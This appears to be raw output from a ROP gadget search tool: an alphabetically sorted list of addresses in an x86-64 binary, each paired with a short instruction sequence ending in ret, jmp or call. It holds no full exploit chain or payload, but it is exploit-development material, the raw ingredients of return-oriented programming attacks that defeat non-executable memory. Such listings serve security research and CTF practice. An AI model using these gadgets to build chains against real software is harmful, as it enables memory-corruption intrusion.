0x00002aaaaab7910e : dec dword ptr [rax - 0x7b] ; ror byte ptr [rdi], 0x85 ; pop rax ; or dword ptr [rax], eax ; add cl, ch ; ret
0x00002aaaaabb4f45 : dec dword ptr [rax - 0x7b] ; ror byte ptr [rdi], 0x94 ; ret 0x8445
0x00002aaaaabe3fe0 : dec dword ptr [rax - 0x7b] ; ror byte ptr [rdi], 0x95 ; ret
0x00002aaaaab5db10 : dec dword ptr [rax - 0x7b] ; sal byte ptr [rax + rbp + 0x48], 0x89 ; ret 0x8948
0x00002aaaaac0c6c6 : dec dword ptr [rax - 0x7b] ; sal byte ptr [rbp + rax*4 + 0x64], 0x48 ; mov dword ptr [rbx], eax ; pop rbx ; ret
0x00002aaaaabff44f : dec dword ptr [rax - 0x7b] ; sal byte ptr [rbx + 0x31], 0xc0 ; pop rbx ; ret
0x00002aaaaabd3380 : dec dword ptr [rax - 0x7b] ; sal byte ptr [rbx + rbx + 0x48], 0x39 ; ret
0x00002aaaaab42cdc : dec dword ptr [rax - 0x7b] ; sal byte ptr [rbx + rdi*2 + 0x48], 0x89 ; ret
0x00002aaaaab44617 : dec dword ptr [rax - 0x7b] ; sal byte ptr [rbx + rdx*2 + 0x48], 0x89 ; ret
0x00002aaaaabda1e6 : dec dword ptr [rax - 0x7b] ; sal byte ptr [rcx + rdi*2 + 0x48], 0x39 ; ret
0x00002aaaaabdd1ef : dec dword ptr [rax - 0x7b] ; sal byte ptr [rsp + rdx + 0x48], 0x89 ; ret
0x00002aaaaab69e30 : dec dword ptr [rax - 0x7d] ; clc ; add dword ptr [rax - 0x77], ecx ; ret
0x00002aaaaac146b6 : dec dword ptr [rax - 0x7d] ; clc ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac144bf : dec dword ptr [rax - 0x7d] ; clc ; dec dword ptr [rax - 0x77] ; ret 0x840f
0x00002aaaaac485cb : dec dword ptr [rax - 0x7d] ; clc ; std ; ja 0x1735a1 ; call 0x1f8b1
0x00002aaaaac0c7b3 : dec dword ptr [rax - 0x7d] ; mov eax, 0xe0 ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab062f1 : dec dword ptr [rax - 0x7d] ; ret
0x00002aaaaab5413f : dec dword ptr [rax - 0x7d] ; ret 0x4007
0x00002aaaaaafac5b : dec dword ptr [rax - 0x7d] ; ret 0x4801
0x00002aaaaabad811 : dec dword ptr [rax - 0x7d] ; ret 0x4804
0x00002aaaaab247b5 : dec dword ptr [rax - 0x7d] ; ret 0x4820
0x00002aaaaabaa975 : dec dword ptr [rax - 0x7d] ; ret 0x4901
0x00002aaaaab937a6 : dec dword ptr [rax - 0x7d] ; ret 0x4909
0x00002aaaaab35ce7 : dec dword ptr [rax - 0x7d] ; ret 0xb908
0x00002aaaaaba4741 : dec dword ptr [rax - 0x7d] ; ret 0xe902
0x00002aaaaaaf49bb : dec dword ptr [rax - 0x7d] ; rol dword ptr [rbx + rbp*8], -0x34 ; mov qword ptr [rdi], rcx ; ret
0x00002aaaaabc570e : dec dword ptr [rax - 0x7f] ; in al, dx ; add byte ptr [rax + rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab4ba48 : dec dword ptr [rax - 0x7f] ; ret
0x00002aaaaac2ecdc : dec dword ptr [rax - 0x7f] ; ret 0x80
0x00002aaaaabc87af : dec dword ptr [rax - 9] ; fmul dword ptr [rax - 0x75] ; jl 0xf37e6 ; sbb byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac5c0fb : dec dword ptr [rax] ; ret 0xfffd
0x00002aaaaac5bf67 : dec dword ptr [rax] ; sal eax, -1 ; pop rax ; ret
0x00002aaaaac5df1b : dec dword ptr [rbp + 6] ; cmc ; call qword ptr [rax]
0x00002aaaaac5df17 : dec dword ptr [rbp + 6] ; cmc ; dec dword ptr [rbp + 6] ; cmc ; call qword ptr [rax]
0x00002aaaaabcd333 : dec dword ptr [rbp + rcx*4 + 0x24] ; sub byte ptr [rax - 0x77], cl ; ret 0x8d49
0x00002aaaaac0c4b0 : dec dword ptr [rbp + rcx*4 + 0x4c] ; and al, 0x2a ; call qword ptr [rax]
0x00002aaaaab13a88 : dec dword ptr [rbp + rcx*4 - 0x54] ; and al, 0x80 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab896a9 : dec dword ptr [rbp + rcx*4 - 0x6c] ; and al, 0x80 ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac5cb37 : dec dword ptr [rbp - 0x21000c84] ; test esi, ebx ; call qword ptr [rax]
0x00002aaaaac5cf3b : dec dword ptr [rbp - 0x51] ; call qword ptr [rcx]
0x00002aaaaabd739e : dec dword ptr [rbp - 0x75] ; push rbp ; add byte ptr [rcx + 0xf], al ; lahf ; ret
0x00002aaaaab34808 : dec dword ptr [rbp - 0x77] ; cld ; mov ebx, 2 ; jmp 0x5bafb
0x00002aaaaaba8b00 : dec dword ptr [rbp - 0x77] ; ret 0x3145
0x00002aaaaabc27ee : dec dword ptr [rbp - 0x77] ; ret 0x8948
0x00002aaaaab6ce0f : dec dword ptr [rbp - 0x7b] ; dec dword ptr [rax - 0x77] ; ret
0x00002aaaaac11b09 : dec dword ptr [rbx + 0x148885d] ; ret 0x8948
0x00002aaaaabc9ff2 : dec dword ptr [rbx + 0x438d0455] ; add dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaabb2e8f : dec dword ptr [rbx + 0x438d047d] ; add dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaac17bdd : dec dword ptr [rbx + 0x480c2444] ; add esp, 0x38 ; ret
0x00002aaaaaba9c38 : dec dword ptr [rbx + rcx*4 + 0x55] ; test al, 0x89 ; ret
0x00002aaaaabc6b1c : dec dword ptr [rbx + rcx*4 - 0x4c] ; and al, 0x10 ; add dword ptr [rax], eax ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaab000a9 : dec dword ptr [rbx + rcx*4 - 0x54] ; clc ; add byte ptr [rax], 0 ; add cl, ch ; ret 0xfffb
0x00002aaaaac6f5fb : dec dword ptr [rbx + rdi + 0x3e840002] ; cli ; jmp rsp
0x00002aaaaabafcd9 : dec dword ptr [rbx - 0x7ac7dbbc] ; ror byte ptr [rdi], 0x85 ; ret 0xfff8
0x00002aaaaab82415 : dec dword ptr [rbx - 0x7cb7fbad] ; ret
0x00002aaaaac5cb9f : dec dword ptr [rbx - 0x7e] ; jmp rdx
0x00002aaaaab22c0e : dec dword ptr [rcx + 0x29] ; ret
0x00002aaaaaba7539 : dec dword ptr [rcx + 0x29] ; ret 0x14eb
0x00002aaaaab227dc : dec dword ptr [rcx + 0x39] ; ret
0x00002aaaaab570a2 : dec dword ptr [rcx + 0x39] ; ret 0x4a74
0x00002aaaaab22f52 : dec dword ptr [rcx + 0x39] ; ret 0x850f
0x00002aaaaabe12ab : dec dword ptr [rcx + 0x415d5bd8] ; pop rsp ; pop r13 ; ret
0x00002aaaaab42362 : dec dword ptr [rcx + 0x415d5be8] ; pop rsp ; ret
0x00002aaaaabcfae1 : dec dword ptr [rcx + 0x458949ef] ; or al, ch ; ret
0x00002aaaaab03bb6 : dec dword ptr [rcx + 0x63] ; add al, 0x86 ; add rax, r14 ; jmp rax
0x00002aaaaab461ef : dec dword ptr [rcx + 0xd99e8d6] ; add byte ptr [rax], al ; mov edx, eax ; jmp 0x71193
0x00002aaaaab283f9 : dec dword ptr [rcx + 0xf50244c] ; ret 0x4c8b
0x00002aaaaac6cb7b : dec dword ptr [rcx + rbp + 0x43740001] ; call rsp
0x00002aaaaac6f853 : dec dword ptr [rcx + rcx*2 + 0x66340002] ; cli ; call rsp
0x00002aaaaab55d0d : dec dword ptr [rcx + rcx*4 + 0x54] ; and al, 0x20 ; call qword ptr [rax]
0x00002aaaaab6a597 : dec dword ptr [rcx + rcx*4 - 0x28] ; jmp 0x953f5
0x00002aaaaab2b4a9 : dec dword ptr [rcx + rcx*4 - 0xa] ; mov rdi, qword ptr [rbp - 0x4a8] ; call rax
0x00002aaaaab20389 : dec dword ptr [rcx + rcx*4 - 0xa] ; mov rdi, r13 ; call rax
0x00002aaaaac104c6 : dec dword ptr [rcx + rcx*4 - 0xa] ; mov rdi, rbp ; call r12
0x00002aaaaab3410d : dec dword ptr [rcx + rcx*4 - 1] ; call 0x7b3a6
0x00002aaaaab2f6d5 : dec dword ptr [rcx - 0x3f] ; sti ; add al, byte ptr [rcx - 0x77] ; ret 0x144
0x00002aaaaabe1394 : dec dword ptr [rcx - 0x5dc27c3e] ; ret
0x00002aaaaab3160a : dec dword ptr [rcx - 0x60f73] ; dec dword ptr [rax + 0x39] ; ret 0x840f
0x00002aaaaabcda13 : dec dword ptr [rcx - 0x73] ; push rsi ; add dword ptr [rax + 0x39], ecx ; ret 0xc72
0x00002aaaaabd6d15 : dec dword ptr [rcx - 0x75] ; call rbx
0x00002aaaaabd719e : dec dword ptr [rcx - 0x75] ; cmp al, 0x24 ; call rbx
0x00002aaaaabd6da8 : dec dword ptr [rcx - 0x75] ; jge 0x101db2 ; call rbx
0x00002aaaaabd6ecf : dec dword ptr [rcx - 0x75] ; jge 0x101ed9 ; call rbx
0x00002aaaaabd7012 : dec dword ptr [rcx - 0x75] ; jge 0x10201c ; call rbx
0x00002aaaaabd7182 : dec dword ptr [rcx - 0x75] ; jge 0x10218c ; call rbx
0x00002aaaaabd89a0 : dec dword ptr [rcx - 0x75] ; jge 0x1039aa ; call rbx
0x00002aaaaabd8ac8 : dec dword ptr [rcx - 0x75] ; jge 0x103ad2 ; call rbx
0x00002aaaaabd8c0b : dec dword ptr [rcx - 0x75] ; jge 0x103c15 ; call rbx
0x00002aaaaabd8d0c : dec dword ptr [rcx - 0x75] ; jge 0x103d16 ; call rbx
0x00002aaaaac485e8 : dec dword ptr [rcx - 0x75] ; jge 0x173614 ; call 0x1f8af
0x00002aaaaabc80d5 : dec dword ptr [rcx - 0x75] ; push rbp ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabe3983 : dec dword ptr [rcx - 0x75] ; push rdi ; sbb byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabc33ac : dec dword ptr [rcx - 0x75] ; push rsi ; sub byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaac17184 : dec dword ptr [rcx - 0x75] ; sub byte ptr [r8 - 0x77], r9b ; ret 0xc148
0x00002aaaaab72dc8 : dec dword ptr [rcx - 0x76b706b9] ; clc ; ret
0x00002aaaaab1d8c5 : dec dword ptr [rcx - 0x77] ; ret
0x00002aaaaabb828d : dec dword ptr [rcx - 0x77] ; ret 0x448b
0x00002aaaaab00c47 : dec dword ptr [rcx - 0x77] ; ret 0x87e9
0x00002aaaaabb270f : dec dword ptr [rcx - 0x77] ; ret 0x8949
0x00002aaaaab23a8e : dec dword ptr [rcx - 0x77] ; ret 0x8b4c
0x00002aaaaaaf7f80 : dec dword ptr [rcx - 0x77] ; ret 0x9e9
0x00002aaaaab491d7 : dec dword ptr [rcx - 0x77] ; sbb byte ptr [r9 - 0x77], r9b ; sub byte ptr [r8 + 1], r9b ; ret 0x8949
0x00002aaaaac5d517 : dec dword ptr [rcx - 0x7c000c25] ; fdiv st(3) ; jmp rax
0x00002aaaaab87539 : dec dword ptr [rcx - 0x7d] ; call 0xffffffffc7446d4c
0x00002aaaaab3b2ef : dec dword ptr [rcx - 0x7d] ; ret
0x00002aaaaab3b2d8 : dec dword ptr [rcx - 0x7d] ; ret 0x4504
0x00002aaaaabacca8 : dec dword ptr [rcx - 0x7d] ; ret 0x4c20
0x00002aaaaac5d74b : dec dword ptr [rcx] ; push rbp ; hlt ; call qword ptr [rbx]
0x00002aaaaac5d683 : dec dword ptr [rcx] ; push rbx ; hlt ; call qword ptr [rbx]
0x00002aaaaab1a04c : dec dword ptr [rcx] ; ret
0x00002aaaaabdeaee : dec dword ptr [rcx] ; setbe al ; ret
0x00002aaaaac5d69f : dec dword ptr [rdi + 0x53] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaabdb962 : dec dword ptr [rdi] ; add byte ptr [rax], al ; or eax, edi ; ret
0x00002aaaaab402e3 : dec dword ptr [rdi] ; and al, 0xc ; add rsp, 0x18 ; ret
0x00002aaaaabf1bbd : dec dword ptr [rdi] ; lahf ; ret 0xc2e9
0x00002aaaaab4e942 : dec dword ptr [rdi] ; lds r11d, ptr [r11 + 0x5d] ; pop r12 ; ret
0x00002aaaaabdf23d : dec dword ptr [rdi] ; mov bh, 4 ; js 0x10a1d1 ; loopne 0x10a258 ; movzx eax, ax ; ret
0x00002aaaaabdf33d : dec dword ptr [rdi] ; mov bh, 4 ; js 0x10a2ce ; loopne 0x10a34e ; ret
0x00002aaaaabdf3bd : dec dword ptr [rdi] ; mov bh, 4 ; js 0x10a351 ; loopne 0x10a3d2 ; movzx eax, ax ; ret
0x00002aaaaabdf63d : dec dword ptr [rdi] ; mov bh, 4 ; js 0x10a5d1 ; loopne 0x10a654 ; movzx eax, ax ; ret
0x00002aaaaab02f46 : dec dword ptr [rdi] ; mov bh, 4 ; js 0x2ded7 ; loopne 0x2df57 ; ret
0x00002aaaaab02f56 : dec dword ptr [rdi] ; mov bh, 4 ; js 0x2deea ; loopne 0x2df71 ; movzx eax, ax ; ret
0x00002aaaaab02f96 : dec dword ptr [rdi] ; mov bh, 4 ; js 0x2df2a ; loopne 0x2dfab ; movzx eax, ax ; ret
0x00002aaaaab03036 : dec dword ptr [rdi] ; mov bh, 4 ; js 0x2dfca ; loopne 0x2e04d ; movzx eax, ax ; ret
0x00002aaaaab1b271 : dec dword ptr [rdi] ; mov dh, 0x43 ; add dword ptr [rax - 0x7d], ecx ; ret
0x00002aaaaab72955 : dec dword ptr [rdi] ; mov dh, 0x45 ; ret
0x00002aaaaab72942 : dec dword ptr [rdi] ; mov dh, 0x45 ; ret 0x8349
0x00002aaaaab73660 : dec dword ptr [rdi] ; mov ebp, 0xf80148c0 ; add rax, r8 ; ret
0x00002aaaaab63c74 : dec dword ptr [rdi] ; mov esp, 0xc2440fc7 ; add eax, 1 ; ret
0x00002aaaaaaf8b8b : dec dword ptr [rdi] ; ret 0x41c3
0x00002aaaaabe9d85 : dec dword ptr [rdi] ; ret 0x8348
0x00002aaaaab89d3a : dec dword ptr [rdi] ; ret 0xd0f7
0x00002aaaaabf5735 : dec dword ptr [rdi] ; ret 0xfe9
0x00002aaaaab5f8a6 : dec dword ptr [rdi] ; rol r11d, -0x48 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaab49151 : dec dword ptr [rdi] ; test ah, al ; add al, byte ptr [rax] ; add byte ptr [rax + 1], cl ; ret
0x00002aaaaab3d467 : dec dword ptr [rdi] ; test byte ptr [rax + rax - 0x7cb80000], ah ; ret
0x00002aaaaac12419 : dec dword ptr [rdi] ; test byte ptr [rax], ah ; add al, byte ptr [rax] ; add byte ptr [rax - 0x39], cl ; ret
0x00002aaaaabadfb0 : dec dword ptr [rdi] ; test byte ptr [rcx - 0x7cfffffb], bh ; ret 0x3902
0x00002aaaaabf724e : dec dword ptr [rdi] ; test byte ptr [rcx], dl ; add dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x3904
0x00002aaaaac0c81a : dec dword ptr [rdi] ; test byte ptr [rdi - 0x7d000000], al ; ret 0x3901
0x00002aaaaab71e28 : dec dword ptr [rdi] ; test byte ptr [rdi - 0x8fffff5], bh ; ret 0
0x00002aaaaab7193b : dec dword ptr [rdi] ; test byte ptr [rdi - 0x8fffff6], ch ; ret 0
0x00002aaaaab71947 : dec dword ptr [rdi] ; test byte ptr [rsi - 0x8fffff6], cl ; ret 0
0x00002aaaaabf693c : dec dword ptr [rdi] ; test byte ptr [rsp + rax - 0x7cb80000], ch ; ret 0x4104
0x00002aaaaac465b0 : dec dword ptr [rdi] ; test dword ptr [rsi + 1], ebp ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaababba1 : dec dword ptr [rdi] ; test dword ptr [rsi], edx ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xeb04
0x00002aaaaabbedfa : dec dword ptr [rdi] ; xchg eax, ebp ; ror byte ptr [rdi], 0xb6 ; ror byte ptr [rdi], 0x47 ; ret 0x90c3
0x00002aaaaab4805b : dec dword ptr [rdi] ; xchg eax, ebp ; sal bh, 0xd8 ; ret
0x00002aaaaabb6f13 : dec dword ptr [rdi] ; xchg eax, esp ; ret 0x8949
0x00002aaaaabb770a : dec dword ptr [rdi] ; xchg eax, esp ; ret 0xb60f
0x00002aaaaab903b0 : dec dword ptr [rdi] ; xchg eax, esp ; ret 0xd021
0x00002aaaaabb4fd0 : dec dword ptr [rdi] ; xchg eax, esp ; ret 0xd609
0x00002aaaaab4af7e : dec dword ptr [rdi] ; xchg eax, esp ; ret 0xdaf7
0x00002aaaaabb82ed : dec dword ptr [rdi] ; xchg eax, esp ; ret 0xf44
0x00002aaaaab273bd : dec dword ptr [rdi] ; xchg eax, esp ; ret 0xfa80
0x00002aaaaabda2df : dec dword ptr [rdi] ; xchg edx, ecx ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0xbc41
0x00002aaaaaba243d : dec dword ptr [rdi] ; xchg esp, esi ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret 0x894c
0x00002aaaaac5d5db : dec dword ptr [rdx + 0x51] ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac5bd27 : dec dword ptr [rdx + 0x628cffee] ; out dx, al ; jmp rsp
0x00002aaaaab31147 : dec dword ptr [rdx + 0x63] ; adc al, 0xa0 ; add rax, rdx ; jmp rax
0x00002aaaaac5cbbf : dec dword ptr [rsi + rdi*2 - 0x7ee8000d] ; call qword ptr [rsi]
0x00002aaaaac5ec77 : dec dword ptr [rsi + rdi*2 - 0xa] ; jmp rdx
0x00002aaaaac5d4c7 : dec dword ptr [rsi - 0x24] ; jmp qword ptr [rdi]
0x00002aaaaac5e047 : dec dword ptr [rsi] ; cmc ; push rsp ; cmc ; call rsp
0x00002aaaaac5d627 : dec dword ptr [rsi] ; push rdx ; hlt ; lcall ptr [rax] ; push rdx ; hlt ; jmp qword ptr [rdx]
0x00002aaaaac6d32b : dec dword ptr [rsp + 0x21040001] ; cmc ; jmp rsp
0x00002aaaaac6d1bb : dec dword ptr [rsp + rdx*2 + 0x20c40001] ; hlt ; call rsp
0x00002aaaaac60a0f : dec eax ; add ebx, edi ; call rax
0x00002aaaaac5bbb7 : dec eax ; pop rsi ; out dx, al ; inc dword ptr [rax + 0x5e] ; out dx, al ; call rsp
0x00002aaaaac5d607 : dec eax ; push rcx ; hlt ; call rdx
0x00002aaaaac5d2c7 : dec ecx ; fcompi st(3) ; call qword ptr [rcx]
0x00002aaaaac5d2c3 : dec ecx ; fcompi st(3) ; dec ecx ; fcompi st(3) ; call qword ptr [rcx]
0x00002aaaaac5d25b : dec ecx ; fcompi st(3) ; ljmp ptr [rdx - 0x2d] ; call qword ptr [rcx]
0x00002aaaaab1ee3d : dec ecx ; ret
0x00002aaaaac5acb7 : dec edx ; push 0x65f7ffed ; in eax, dx ; call rdx
0x00002aaaaac5aca3 : dec edx ; push 0x68caffed ; in eax, dx ; jmp qword ptr [rdx]
0x00002aaaaac69ccb : dec esi ; pop rbx ; cld ; push qword ptr [rbx + rbx*2 - 4] ; jmp rsp
0x00002aaaaac6fda3 : dec esp ; adc eax, 0x77440001 ; std ; call rsp
0x00002aaaaac6c59b : dec esp ; add al, byte ptr [rcx] ; add ah, dl ; mov ebp, edi ; jmp rsp
0x00002aaaaac6f553 : dec esp ; add al, byte ptr ss:[rax] ; adc al, 0x29 ; cli ; jmp rsp
0x00002aaaaac6b203 : dec esp ; add byte ptr [rax], 0 ; xchg eax, esp ; adc ch, dl ; jmp rsp
0x00002aaaaac6d3d3 : dec esp ; add dword ptr [eax], eax ; test byte ptr [rdx - 0xb], al ; jmp rsp
0x00002aaaaac6c5e3 : dec esp ; add eax, dword ptr [rcx] ; add byte ptr [rdx + rdx*4], al ; out dx, eax ; jmp rsp
0x00002aaaaac6f74b : dec esp ; add r8b, byte ptr [rax] ; hlt ; push rdi ; cli ; jmp rsp
0x00002aaaaac6ca9b : dec esp ; and al, byte ptr [rcx] ; add byte ptr [rdi - 0xf], dl ; jmp rsp
0x00002aaaaac6ad13 : dec esp ; imul eax, dword ptr [rax], 0xe9710400 ; jmp rsp
0x00002aaaaac6e77b : dec esp ; iretd ; add dword ptr [rax], eax ; je 0x199799 ; clc ; jmp rsp
0x00002aaaaac6da53 : dec esp ; mov dword ptr [rcx], eax ; add byte ptr [rsi + rsi*2 - 0xa], dh ; jmp rsp
0x00002aaaaac6fadb : dec esp ; pop rcx ; add al, byte ptr [rax] ; test cl, cl ; cli ; jmp rsp
0x00002aaaaac6e553 : dec esp ; ret
0x00002aaaaac6bc0b : dec esp ; rol dword ptr [rax], 0 ; and al, 0xd4 ; in eax, dx ; jmp rsp
0x00002aaaaac6b71b : dec esp ; sahf ; add byte ptr [rax], al ; add al, 0xa6 ; jmp 0x19672b
0x00002aaaaac6b8b3 : dec esp ; test eax, 0x59440000 ; in eax, dx ; jmp rsp
0x00002aaaaac6b6a3 : dec esp ; wait ; add byte ptr [rax], al ; jmp 0x1966b3
0x00002aaaaac6ccc3 : dec esp ; xor al, byte ptr [rcx] ; add byte ptr [rax + rdx*4], al ; jmp rsp
0x00002aaaaab78de9 : dec qword ptr [r8 + 0x29] ; ret 0x149
0x00002aaaaab76d91 : dec qword ptr [r8 + 0x29] ; ret 0x280f
0x00002aaaaab41896 : dec qword ptr [r8 + 0xf] ; add dword ptr [r8 - 0x7d], ecx ; ret 0x4502
0x00002aaaaaafac5a : dec qword ptr [rax - 0x7d] ; ret 0x4801
0x00002aaaaabacca7 : dec qword ptr [rcx - 0x7d] ; ret 0x4c20
0x00002aaaaac8e3d1 : div bh ; call qword ptr [rdx]
0x00002aaaaabb09fd : div byte ptr [rax - 0xa] ; ret
0x00002aaaaab6af3f : div byte ptr [rbp + 0xa] ; jmp 0x95f0a
0x00002aaaaab5fd12 : div byte ptr [rbp + 4] ; xor rax, rax ; ret
0x00002aaaaab73171 : div byte ptr [rbp - 0x14] ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaabcf0d7 : div byte ptr [rcx] ; shr al, 0x71 ; ret
0x00002aaaaab39124 : div dh ; ret
0x00002aaaaab28999 : div dh ; ret 0x4050
0x00002aaaaabe6b13 : div dword ptr [rcx] ; shr al, 0x65 ; ret
0x00002aaaaabcae61 : div dword ptr [rdi - 0x14] ; ret
0x00002aaaaab68a44 : div dword ptr [rdx] ; add byte ptr [rcx + 0x39], cl ; ror byte ptr [rdi + rcx + 0x47], 1 ; ret 0x894c
0x00002aaaaab43290 : div ebp ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab4d18c : div ebp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabebc2f : div ebx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab4d1cf : div ebx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabebd2c : div ebx ; pop rbx ; pop rbp ; ret
0x00002aaaaab254c5 : div ecx ; add eax, r8d ; ret
0x00002aaaaab7f12a : div ecx ; pop rbx ; mov eax, eax ; ret
0x00002aaaaac6ddb1 : div esi ; call rsp
0x00002aaaaab43796 : div esi ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab43795 : div r14 ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaab4328f : div rbp ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab4d18b : div rbp ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabebc2e : div rbx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab4d1ce : div rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaabebd2b : div rbx ; pop rbx ; pop rbp ; ret
0x00002aaaaac5bbb4 : enter -0x11a2, -1 ; enter -0x11a2, -1 ; pop rsi ; out dx, al ; call rsp
0x00002aaaaac5bbb8 : enter -0x11a2, -1 ; pop rsi ; out dx, al ; call rsp
0x00002aaaaac77a28 : enter -0x12bd, -1 ; and eax, 0x4000001 ; ret 0x18f
0x00002aaaaaaf4977 : enter -0x1401, -0x3b ; ret
0x00002aaaaaba5aa1 : enter -0x14fe, -0x75 ; nop dword ptr [rax] ; ret
0x00002aaaaab7f069 : enter -0x173f, 0xe ; and eax, 0x3fc00 ; pop rbx ; ret
0x00002aaaaab7f048 : enter -0x173f, 6 ; and eax, 0x3fffc00 ; pop rbx ; ret
0x00002aaaaabc2f60 : enter -0x1d2d, -0x7b ; ret 0x850f
0x00002aaaaac10b0f : enter -0x1f01, 0x66 ; nop dword ptr [rax + rax] ; ret
0x00002aaaaab1aa23 : enter -0x1f3f, 0x1e ; or eax, edx ; ret
0x00002aaaaab7307e : enter -0x208c, -0xd ; ret
0x00002aaaaab756e1 : enter -0x2d7c, 0x74 ; cmp dh, dh ; ret 0x7501
0x00002aaaaabbc244 : enter -0x2e89, 0x39 ; ret
0x00002aaaaaaf4967 : enter -0x2eff, 0x39 ; ret 0xffb8
0x00002aaaaac03d61 : enter -0x3eb8, -0x1f ; or byte ptr [rax - 0x77], cl ; ret 0x314c
0x00002aaaaac06807 : enter -0x3f77, 0x48 ; mov dword ptr [rdx], eax ; mov eax, 1 ; ret
0x00002aaaaab9b646 : enter -0x3f97, -0x70 ; add dword ptr [rax], eax ; add byte ptr [rcx], ch ; ret
0x00002aaaaac46724 : enter -0x3fe7, -0x7d ; fdivr st(7) ; ret
0x00002aaaaab9bcfc : enter -0x4e8b, -0x70 ; xor eax, eax ; add rsp, 0x10 ; pop rbx ; ret
0x00002aaaaac60a10 : enter -0x4ff, -1 ; rol byte ptr [rcx], 1 ; sti ; jmp rax
0x00002aaaaab0b2c2 : enter -0x72b4, -0x76 ; add byte ptr [rax], 0 ; add byte ptr [rcx + 0xf], al ; xchg eax, esi ; ret 0x394c
0x00002aaaaab78c66 : enter -0x72b8, 0x49 ; dec byte ptr [rax + 0x29] ; ret 0x149
0x00002aaaaab76c4e : enter -0x72b8, 0x49 ; dec byte ptr [rax + 0x29] ; ret 0x280f
0x00002aaaaab78de6 : enter -0x72b8, 0x49 ; dec dword ptr [rax + 0x29] ; ret 0x149
0x00002aaaaab76d8e : enter -0x72b8, 0x49 ; dec dword ptr [rax + 0x29] ; ret 0x280f
0x00002aaaaab09b68 : enter -0x73f, 0x1f ; not eax ; and eax, edx ; ret
0x00002aaaaab1ddab : enter -0x74b8, 0x14 ; ret
0x00002aaaaab8160d : enter -0x74b8, 5 ; ret
0x00002aaaaab4a28f : enter -0x76b4, -0x17 ; mov rdi, r15 ; xor r8d, r8d ; call rbx
0x00002aaaaab1d9b2 : enter -0x76b4, 7 ; shl r9, cl ; mov qword ptr [rdi - 8], r9 ; ret
0x00002aaaaab1dabc : enter -0x76b4, 7 ; shr r9, cl ; mov qword ptr [rdi + 8], r9 ; ret
0x00002aaaaab6df7c : enter -0x7780, 0x45 ; ror dword ptr [rcx + 0x1ef8c1f8], -0x77 ; ret 0x8b48
0x00002aaaaaad7be4 : enter -0xc08, -0x3d ; mov bh, 0xb1 ; or cl, cl ; clc ; ret
0x00002aaaaabd6df4 : enter -2, -1 ; mov rdi, qword ptr [r15] ; call rbx
0x00002aaaaaba5dbf : enter 0, 0 ; add byte ptr [rax - 0x75], cl ; pop rbp ; adc al, ch ; ret
0x00002aaaaac066a7 : enter 0, 0 ; call rax
0x00002aaaaac06669 : enter 0, 0 ; jmp rcx
0x00002aaaaac01376 : enter 0, 0 ; lea r9, qword ptr [rsp + 0x30] ; call qword ptr [rax]
0x00002aaaaab1cc8d : enter 0, 0 ; movsxd rcx, dword ptr [r11 + rcx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaabddcb3 : enter 0, 0 ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret
0x00002aaaaab7f3d8 : enter 0x1577, 0x48 ; sub edi, 0x10 ; add rax, rdi ; ret
0x00002aaaaabd8ed8 : enter 0x22e8, -0x79 ; cli ; dec dword ptr [rax + 0x39] ; ret
0x00002aaaaab51c4a : enter 0x2373, 0xf ; mov dh, 0 ; ret
0x00002aaaaac46720 : enter 0x275, 0x39 ; enter -0x3fe7, -0x7d ; fdivr st(7) ; ret
0x00002aaaaab09cbc : enter 0x280f, -0x3f ; ret
0x00002aaaaab1f13e : enter 0x289, -0x48 ; add dword ptr [rax], eax ; add byte ptr [rax], al ; ret
0x00002aaaaac03185 : enter 0x289, -0x77 ; fiadd dword ptr [rcx - 1] ; push rbp ; adc byte ptr [rcx], bh ; ret
0x00002aaaaab5f57d : enter 0x31c3, -0x40 ; ret
0x00002aaaaab04a58 : enter 0x348, 5 ; mov byte ptr [rax + 0x39], dl ; add byte ptr [rax - 0x77], cl ; ret 0x8348
0x00002aaaaac107f2 : enter 0x389, 0x48 ; add esp, 0x10 ; mov eax, edx ; pop rbx ; ret
0x00002aaaaab25fb6 : enter 0x415b, 0x5c ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x00002aaaaab5beae : enter 0x415d, 0x5c ; pop r13 ; pop r14 ; ret
0x00002aaaaac09517 : enter 0x4189, 0x48 ; mov eax, 1 ; ret
0x00002aaaaac09474 : enter 0x4189, 0x54 ; mov eax, 1 ; ret
0x00002aaaaac09544 : enter 0x4189, 0x58 ; mov eax, 1 ; ret
0x00002aaaaac70d0e : enter 0x4201, 0xe ; rol byte ptr [rcx], 3 ; ret 0xe01
